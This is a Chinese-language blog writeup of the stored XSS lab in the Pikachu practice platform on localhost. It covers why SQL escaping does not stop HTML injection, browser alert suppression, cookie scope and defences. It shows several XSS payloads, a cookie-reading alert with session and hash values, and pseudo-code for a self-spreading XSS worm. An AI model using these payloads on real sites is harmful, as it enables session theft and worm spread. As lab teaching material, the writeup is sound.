---
layout: post
title: Pikachu - 存储型 XSS Writeup（含"刷新不弹窗"排坑）
platform: pikachu
date: 2026-10-26 16:24:00 +0800
categories: CTF
---

Pikachu - 存储型 XSS Writeup（含"刷新不弹窗"排坑）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → 存储型 XSS
- 地址：`http://localhost/pikachu/vul/xss/xss_stored.php`
- 题型：Web
- 考点：**存储型 XSS**、**SQL 转义 ≠ HTML 转义**、浏览器弹窗压制

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**页面形态**：一个公开的留言板，不需要登录

```text
我是一个留言板：
┌──────────────────────────────────────┐
│  （textarea，可以拉大拉小）             │
└──────────────────────────────────────┘
[ submit ]

留言列表：
xxx 留言内容    删除
```

**✅ 实测结果**

```text
★ 提交 <script>alert(1)</script>
    → 提交瞬间弹窗 ✅

★ F5 刷新页面
    → 不弹了 ⚠️（第一反应：以为没打通）

★ 查数据库：
    mysql> select id, content from message;
    57 | <script>alert(1)</script>
    58 | <script>alert(1)</script>
    59 | <script>alert(document.cookie)</script>
    ★ 原样存着，一点没转义 ✅

★ 直接请求页面看返回的 HTML：
    含 <script>alert: True
    留言内容: '<script>alert(1)</script>'
    ★ 服务端也是原样输出 ✅

★ 结论：漏洞成立，只是浏览器的"弹窗压制"让它刷新后不明显
```

二、题目分析

**① 提交逻辑（★ 这里有转义，但是转错了方向）**

```php
<?php
// xss_stored.php 第 23-31 行
if(array_key_exists("message", $_POST) && $_POST['message'] != null){
    $message = escape($link, $_POST['message']);        // ★ 转义了
    $query = "insert into message(content,time) values('$message', now())";
    $result = execute($link, $query);
    if(mysqli_affected_rows($link) != 1){
        $html .= "<p>数据库出现异常，提交失败！</p>";
    }
}
?>
```

**`escape()` 的定义**：

```php
// inc/mysql.inc.php 第 29 行
function escape($link, $data){
    if(is_string($data)){
        return mysqli_real_escape_string($link, $data);
    }
    ...
}
```

**★ `mysqli_real_escape_string` 转义的是什么**：

```
被转义的字符：
    '   "   \   \n   \r   \0   \x1a

不转义的字符：
    <   >   &   /   （HTML 特殊字符）
    
★ 所以 <script> 完好无损地进了数据库
```

**② 输出逻辑（★ 这里完全没转义）**

```php
<?php
// xss_stored.php 第 80-84 行
$query = "select * from message";
$result = execute($link, $query);
while($data = mysqli_fetch_assoc($result)){
    // ★★★ 直接从数据库取出来，原样 echo
    echo "<p class='con'>{$data['content']}</p>
          <a href='xss_stored.php?id={$data['id']}'>删除</a>";
}
?>
```

**★ 漏洞链条**：

```
用户输入 <script>alert(1)</script>
    ↓
escape() 只转义 SQL 字符 → <script> 原样
    ↓
INSERT INTO message → 数据库里存的是 <script>alert(1)</script>
    ↓
SELECT 出来 → echo 原样输出
    ↓
浏览器解析 → 执行
```

**③ ⭐ 本题最重要的认知：SQL 转义 ≠ HTML 转义**

```text
mysqli_real_escape_string()
    → 防 SQL 注入（保护【数据库】）
    → 不防 XSS（不保护【浏览器】）

htmlspecialchars()
    → 防 XSS（保护【浏览器】）
    → 不防 SQL 注入（不保护【数据库】）
```

**★ 为什么必须分开**：

```text
数据在系统里经过多个"上下文"：

    用户输入
        ↓  [SQL 上下文]  ← 需要 SQL 转义
    数据库
        ↓  [HTML 上下文] ← 需要 HTML 转义
    网页

★ 每个"边界"都要按自己的规则转义
★ 在 SQL 层做转义，保护不了 HTML 层
★ 这就是"上下文相关的转义"（Context-Aware Escaping）原则
```

**★ 类比**：

```
SQL 转义 = 给包裹贴防水标签（保护运输过程）
HTML 转义 = 给包裹装防爆箱（保护拆开时的人）

★ 你只贴了防水标签，包裹里是炸弹照样炸
```

**④ 存储型 XSS 的本质：持久化**

```text
反射型：
    恶意代码在 URL 里
    → 服务器"反射"回页面
    → 每次触发都需要带那个 URL
    
存储型：
    恶意代码在【数据库】里
    → 每一次页面加载都会读出来
    → 所有访问者都中招
    → 直到被删除
```

**⑤ 三种 XSS 的完整对比**

| | **反射型** | **存储型** | **DOM 型** |
|---|---|---|---|
| 恶意代码在哪 | URL 参数 | **数据库** | URL（但由 JS 渲染）|
| 谁处理 | 服务器 PHP | 服务器 PHP | **浏览器 JS** |
| 是否持久 | ❌ | ✅ **持久** | ❌ |
| 受害者怎么中招 | **必须点链接** | **访问正常页面就中招** | 必须点链接 |
| 需要社工吗 | ✅ 需要 | ❌ **不需要** | ✅ 需要 |
| 影响范围 | 单个点击者 | **所有访问者** | 单个点击者 |
| 危害等级 | ⭐⭐ | **⭐⭐⭐⭐** | ⭐⭐ |

**★ 存储型最危险的原因**：

```
① 不需要社工 → 攻击者不用骗人
② 影响所有访问者 → 一次投毒，全员中招
③ 持久存在 → 直到被发现并删除
④ 可以做成"XSS 蠕虫" → 自动传播（见延伸知识）
```

三、解题步骤

**第 1 步：打开留言板**

```text
http://localhost/pikachu/vul/xss/xss_stored.php
```

**★ 注意：这个页面**不需要登录**，任何人都能访问。**

**第 2 步：先看正常功能**

```text
① 文本框里输入：hello pikachu
② 点 submit
③ 页面下方出现：
     留言列表：
     hello pikachu    删除
```

**★ 说明留言被存进数据库并显示出来了。**

**第 3 步：判断有没有转义（第一个测试）**

**提交**：

```html
<b>test</b>
```

**看页面输出**：

```text
<b>test</b> 显示成【加粗的 test】  → HTML 被解析 → 有 XSS ✅
<b>test</b> 原样显示文字          → 被转义了
```

**本题结果**：**加粗显示** → 未转义。

**第 4 步：弹窗测试**

**提交**：

```html
<script>alert(1)</script>
```

**结果**：

```
提交瞬间 → 弹窗 "1"                    ✅
```

**★ 这一步说明：服务端未转义，浏览器执行了。**

**第 5 步：⚠️ 排坑 —— 刷新后不弹了**

**现象**：

```text
① 提交 <script>alert(1)</script>  → 弹窗 ✅
② 按 F5 刷新页面                  → 不弹了 ❌
```

**第一反应**：是不是没存进去？是不是被转义了？

**实际排查（两步）**：

**排查 A：查数据库**

```powershell
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root `
  -e "use pikachu; select id, content from message;"
```

**输出**：

```text
id  content
57  <script>alert(1)</script>
58  <script>alert(1)</script>
59  <script>alert(document.cookie)</script>
```

**★ 原样存着 —— 数据库没问题。**

**排查 B：看服务端返回的 HTML**

```python
import urllib.request, re
url = "http://localhost/pikachu/vul/xss/xss_stored.php"
with urllib.request.urlopen(url) as r:
    body = r.read().decode("utf-8", "replace")
print("含 <script>alert:", "<script>alert" in body)
for m in re.finditer(r"<p class='con'>(.*?)</p>", body, re.S):
    print("留言内容:", repr(m.group(1)))
```

**输出**：

```text
含 <script>alert: True
留言内容: '<script>alert(1)</script>'
留言内容: '<script>alert(document.cookie)</script>'
```

**★ 服务端也原样输出了 —— 那问题在哪？**

**★ 结论：浏览器在压制弹窗。**

```text
Chrome / Edge 的"弹窗垃圾"防护（Dialog Spam Prevention）：

    页面加载时如果没有【用户交互】（点击、按键、触摸）
    → 调用 alert() 可能被【静默压制】
    → 地址栏右侧会出现"已阻止对话框"的图标

提交时：你点过 submit（有交互）→ 弹窗正常
刷新时：没有任何交互     → 被压制

★ 所以"不弹"≠"漏洞不存在"
★ 只是"浏览器不给你看弹窗"
```

**排查 C：看地址栏有没有被阻止的提示**

```text
刷新页面后，看地址栏最右边
有没有  ⊘  或 "此页面已被阻止显示对话框" 的图标
点它 → 会显示"已阻止 N 个对话框"
```

**第 6 步：⭐ 改用"可见效果"验证（不依赖弹窗）**

**★ 这是最可靠的验证方式。**

**载荷 1：改标签页标题**

```html
<script>document.title='XSS-STORED'</script>
```

**验证**：

```
① 提交 → 标签页标题变成 "XSS-STORED"
② F5 刷新 → 标题还是 "XSS-STORED" ✅
③ 新开标签页访问同一地址 → 标题也变成 "XSS-STORED" ✅
④ 关掉浏览器重开 → 还是 ✅
```

**★ 这就是"存储型"的铁证：不依赖任何参数，谁来都中招。**

**载荷 2：改页面背景（最直观）**

```html
<script>document.body.style.background='red'</script>
```

**★ 刷新后整页变红 —— 想忽略都难。**

**载荷 3：插入一段可见文字**

```html
<script>document.body.insertAdjacentHTML('afterbegin','<h1 style="color:red">你被 XSS 了</h1>')</script>
```

**载荷 4：`<img onerror>`（有时比 `<script>` 更容易触发）**

```html
<img src=x onerror=alert(1)>
```

**第 7 步：验证危害 —— 偷 cookie**

**提交**：

```html
<script>alert(document.cookie)</script>
```

**弹窗显示**：

```
PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5
ant[uname]=admin
ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815
```

**★ 注意三个 cookie 的来源**：

| Cookie | 谁设的 | 说明 |
|---|---|---|
| `PHPSESSID` | PHP 默认 | 会话 ID |
| `ant[uname]` | **反射型 XSS(post) 那关登录时** | 用户名 |
| `ant[pw]` | **同上** | `sha1(md5(密码))` |

**★ 关键认知：cookie 按【域名】隔离，不按路径**

```text
你在 localhost 下的两个页面：

    /pikachu/vul/xss/xsspost/post_login.php   → 设了 ant[uname] / ant[pw]
    /pikachu/vul/xss/xss_stored.php           → 能读到那两个 cookie

★ 因为它们在同一个域名 localhost 下
★ 所以：任何页面的 XSS，都能偷走整个域的所有 cookie
★ 这就是"一点沦陷，全站失守"
```

**第 8 步：清理测试留言**

**方式 A：点页面上的"删除"链接**

```text
每条留言后面的 删除 → 访问 xss_stored.php?id=xxx
```

**方式 B：直接清库**

```powershell
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root `
  -e "use pikachu; delete from message;"
```

**★ 顺便看源码第 33-45 行，作者留了个"彩蛋"**：

```php
// 第 35 行注释：
//彩蛋:虽然这是个存储型xss的页面,但这里有个delete的sql注入
$query = "delete from message where id={$_GET['id']}";    // ★ 直接拼接
$result = execute($link, $query);
```

**★ 但前面有 `is_numeric` 挡着**：

```php
if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
```

**★ 所以真正的注入比较难（`is_numeric` 会拒绝大部分 payload）—— 这是 pikachu 的一个"半成品彩蛋"。**

四、延伸知识

**① 上下文相关的转义（Context-Aware Escaping）**

**同一份数据，在不同位置需要不同的转义方式**：

| 输出位置 | 需要的转义 | 例子 |
|---|---|---|
| HTML 标签之间 | `htmlspecialchars` | `<p>用户输入</p>` |
| HTML 属性值里 | `htmlspecialchars` + 引号 | `<input value="用户输入">` |
| JS 字符串里 | `json_encode` / 转义 `</script>` | `var x = "<用户输入>"` |
| URL 参数里 | `urlencode` | `<a href="/?q=用户输入">` |
| CSS 里 | 特殊处理 | `<div style="color:用户输入">` |
| **SQL 里** | `mysqli_real_escape_string` / **预编译** | `where name='用户输入'` |

**★ 本关的错误：在 SQL 层做转义，却指望它保护 HTML 层。**

**② XSS 的三种"上下文"（这也是后面几关要考的）**

```text
① HTML 标签之间（本关）
   payload: <script>alert(1)</script>
   防御：    htmlspecialchars（把 < 变 &lt;）

② HTML 属性里（xss之href输出 那关）
   <a href="用户输入">
   payload: javascript:alert(1)
   防御：    校验协议（只允许 http/https）+ htmlspecialchars

③ JS 代码里（xss之js输出 那关）
   <script>var x = "用户输入";</script>
   payload: ";alert(1)//
   防御：    json_encode + 转义 </script>
```

**★ 这三关后面都会考，本关是最基础的"标签之间"。**

**③ 浏览器弹窗压制：一个真实的坑**

**现象**：

```text
提交时弹窗，刷新后不弹
```

**原因**：

```text
Chrome / Edge 从 2019 年起有"Dialog Spam Prevention"：

    · 页面没有用户交互时，alert/confirm/prompt 可能被压制
    · 防止恶意页面无限弹窗骚扰用户
    · 被压制时地址栏会显示一个小图标
```

**规避方法**：

```text
① 用"可见的 DOM 效果"验证（推荐）
   document.title = 'XSS'
   document.body.style.background = 'red'
   document.body.insertAdjacentHTML(...)

② 先点一下页面（制造用户交互），再触发
   例如在 payload 里加一个 setTimeout 配合点击

③ 用 <img onerror> 代替 <script>
   有时能绕过（取决于浏览器策略）

④ 用 console.log 看输出（F12 控制台）
   <script>console.log('XSS:'+document.cookie)</script>

★ 最可靠的是 ①：改标题 / 改背景 —— 浏览器不会压制这些
```

**★ 这个坑的价值**：

```
"以为没打通" 和 "真的没打通" 是两件事
→ 一定要用【多种方式】交叉验证
→ 数据库查一遍、服务端响应看一遍、浏览器效果试一遍
```

**④ Cookie 的同域共享：为什么"一点沦陷，全站失守"**

```text
Cookie 的隔离规则：

    按【域名】隔离：  localhost 的 cookie 所有路径共享
    按【路径】可选：  path=/pikachu 限定范围（如果设置的话）
    按【端口】不隔离：localhost:80 和 localhost:8000 共享 cookie

★ pikachu 的 session cookie 设的是 path=/
★ 所以整个 localhost 下所有页面共享
```

**★ 这意味着**：

```
留言板上的一个存储型 XSS
    → 能读到：
        · 你的 PHPSESSID
        · 你在 CSRF 模块的 session
        · 你在 XSS(post) 模块的 ant[uname] / ant[pw]
        · 你在任何基于 cookie 的模块的凭证

★ 攻击者拿到这些 cookie，可以做：
    · 冒充你登录任何模块
    · 用 ant[pw] 做 Pass-the-Hash（永久有效）
```

**⑤ 存储型 XSS 的"终极形态"：XSS 蠕虫**

**真实案例**：

```
2005 年 MySpace Samy 蠕虫（第一个 XSS 蠕虫）
    · 作者 Samy 在个人资料页注入 JS
    · 任何访问者都会自动：
        ① 把他加为好友
        ② 在自己的资料页复制同样的代码
    · 结果：20 小时感染 100 万用户
    · Samy 被 FBI 调查，判 3 年缓刑 + 社区服务

2011 年新浪微博 XSS 蠕虫
    · 传播量级：数万账号自动转发

2014 年 推特 XSS（"onmouseover" 蠕虫）
    · 通过"悬停即触发"的 payload 传播
```

**★ 蠕虫的核心**：

```javascript
// 伪代码
fetch('/api/post', {
    method: 'POST',
    body: 'content=' + encodeURIComponent(
        '<script>/* 同样的代码 */</script>'
    )
});
// ① 自动发帖（把恶意代码复制到自己的新帖）
// ② 别人的浏览器访问 → 执行 → 又发帖
// ③ 指数级传播
```

**★ 这就是为什么存储型 XSS 被单独列为"最高危"**：

```
反射型：一对一（点一次中一次）
存储型：一对多（一次投毒，全员中招）
蠕虫：  指数级（自己复制自己）
```

**⑥ 防御：三层**

**第一层：输出转义（根本）**

```php
// 输出时转义（不管数据从哪来）
$safe = htmlspecialchars($data['content'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "<p class='con'>{$safe}</p>";
```

**★ 注意：应该是"输出时转义"，不是"输入时转义"**

```text
❌ 输入时转义（本关的做法）：
    存进数据库的是 &lt;script&gt;
    → 以后任何地方用这条数据都得反向解码，很麻烦
    → 而且换个上下文（比如输出到 JS）又要重新处理

✅ 输出时转义：
    数据库存原文
    每次输出按当前上下文转义
    → 数据保持干净，转义在正确的位置发生
```

**第二层：CSP（内容安全策略）**

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; object-src 'none'">
```

**★ 效果**：

```text
即使数据库里存了 <script>alert(1)</script>
浏览器也会拒绝执行（因为不是来自 'self' 而是内联脚本）

★ 内联脚本会被拦 → 只有外链白名单的 JS 能跑
```

**第三层：HttpOnly + 输入校验（减损）**

```php
session_set_cookie_params([
    'httponly' => true,      // XSS 读不到 session cookie
    'samesite' => 'Lax',
]);
```

**★ 注意**：

```
HttpOnly 只保护 session cookie
本关的 ant[uname] / ant[pw] 是 setcookie() 单独设的
→ 需要显式加：
   setcookie('ant[pw]', $v, ['httponly' => true, 'samesite' => 'Lax']);
```

**⑦ 一个有意思的问题：这个留言板为什么不删不显示"删除成功"？**

```php
// 第 38-43 行
if(mysqli_affected_rows($link) == 1){
    echo "<script type='text/javascript'>document.location.href='xss_stored.php'</script>";
} else {
    $html .= "<p id='op_notice'>删除失败,请重试并检查数据库是否还好!</p>";
}
```

**★ 注意这里用 `echo "<script>..."` 做跳转 —— 本身也是一种"在 HTML 里写 JS"的做法。**

**★ 在真实开发中，应该用 `header("location: ...")` 而不是输出 JS。**

五、总结

- **本题核心：输入用 `mysqli_real_escape_string` 转义了（防 SQL 注入），但输出完全没有 HTML 转义 → 存储型 XSS。**

- **关键代码两处**：

```php
// ① 输入：只做了 SQL 转义
$message = escape($link, $_POST['message']);   // mysqli_real_escape_string

// ② 输出：什么转义都没做
echo "<p class='con'>{$data['content']}</p>";
```

- **⭐ 四个必记要点**：

```text
① SQL 转义 ≠ HTML 转义
   → escape() 保护数据库，不保护浏览器
   → 两个上下文需要两套转义

② 存储型不需要社工
   → 恶意代码在数据库里
   → 谁来访问谁中招

③ 验证 XSS 别只靠 alert
   → 浏览器会压制无交互的弹窗
   → 改用 document.title / body 背景 / console.log

④ cookie 按域名隔离，不按路径
   → 一个页面的 XSS = 全站 cookie 泄露
   → 包括其他模块的登录凭证
```

- **实测数据**：

```text
提交：<script>alert(1)</script>
    → 提交瞬间弹窗 ✅
    → F5 刷新不弹 ⚠️（浏览器压制，非漏洞消失）

数据库：
    57 | <script>alert(1)</script>
    58 | <script>alert(1)</script>
    59 | <script>alert(document.cookie)</script>
    ★ 原样存储，无转义

服务端响应：
    含 <script>alert: True
    ★ 原样输出

cookie 泄露：
    PHPSESSID + ant[uname]=admin + ant[pw]=10470c3b...
    ★ 后两个来自 XSS(post) 模块（同域共享）
```

- **三种 XSS 的定位**：

```text
反射型：骗人点链接（社工）        —— 已有两关
存储型：等人来访问（挂马）        —— 本题
DOM 型：前端 JS 自己造成的         —— 后面几关
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 直接拼接，需绕 maxlength
✅ 反射型xss(post)     —— 需登录 + 自动提交表单 + Pass-the-Hash
✅ 存储型xss           —— 本题：SQL 转义≠HTML 转义
⬜ DOM型xss            —— 客户端 JS 导致的
⬜ DOM型xss-x          —— DOM 型进阶
⬜ xss之盲打           —— 后台触发
⬜ xss之过滤           —— 绕过过滤
⬜ xss之htmlspecialchars —— 防护演示
⬜ xss之href输出        —— 属性上下文
⬜ xss之js输出          —— JS 上下文
```

**手工复现要点**：

```text
· 打开 xss_stored.php（不需要登录）
· 提交 <b>test</b> → 看是否加粗（判断转义）
· 提交 <script>alert(1)</script> → 提交瞬间弹窗
· F5 刷新 → 不弹（浏览器压制）
· 查数据库 → 确认原样存储
· 换 <script>document.title='XSS'</script> → 刷新后标题仍是 XSS
· 提交 alert(document.cookie) → 看三个 cookie
· 点"删除"清理留言
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  存储型 XSS = 一次投毒，全员中招                              │
│                                                            │
│  根源：输入只做了 SQL 转义，输出没做 HTML 转义                 │
│                                                            │
│  ★ 反射型要骗人点，存储型等人来                             │
│  ★ 验证别只靠 alert（浏览器会吞）                            │
│  ★ 一个页面的 XSS = 整个域的 cookie 全泄露                   │
│                                                            │
│  正确做法：输出时按上下文转义 + CSP + HttpOnly               │
└────────────────────────────────────────────────────────────┘
```
